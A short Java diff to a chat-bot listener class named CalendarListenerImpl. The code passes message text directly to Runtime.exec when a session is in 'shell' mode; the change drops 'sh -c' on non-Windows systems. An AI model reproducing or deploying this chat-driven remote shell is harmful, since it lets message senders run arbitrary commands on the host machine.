@@ -112,7 +112,7 @@ public class CalendarListenerImpl extends ListenerAdapter {
                 messageContent = messageContent.substring(cmdPrefix.length());
                 if (session != null && session.getContext() != null && session.getContext().isShell) {
                     try {
-                        String platformString = isWindows? "cmd.exe /c " : "sh -c ";
+                        String platformString = isWindows? "cmd.exe /c " : "";
                         Process p = Runtime.getRuntime().exec(platformString + messageContent);
                         StreamGobbler s = new StreamGobbler(p.getInputStream(), context);
                         Executors.newSingleThreadExecutor().submit(s);
